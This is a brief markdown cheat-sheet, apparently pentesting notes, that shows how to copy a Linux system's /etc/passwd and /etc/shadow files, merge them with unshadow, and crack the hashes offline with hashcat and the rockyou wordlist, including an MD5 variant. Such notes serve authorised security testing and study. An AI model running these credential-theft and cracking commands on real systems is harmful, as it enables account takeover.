### Content
- [Cracking Linux Credentials](#cracking-linux-credentials)
---
## Cracking Linux Credentials

If the attacker had admin privileges over the system to access `shadow` and `passwd` files.
1. Unshadow
	``` bash
	$ sudo cp /etc/passwd /tmp/passwd.bak
	$ sudo cp /etc/shadow /tmp/shadow.bak
	$ unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
	```
2. Hashcat - Cracking Unshadowed Hashes
	``` bash
	hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
	```

> [!Note]
> In case of using MD5 hashing algorithm, Collect the hashes into a file, one hash value per line, then use the next command to crack them.
> `hashcat -m 500 -a 0 md5-hashes.list rockyou.txt`

---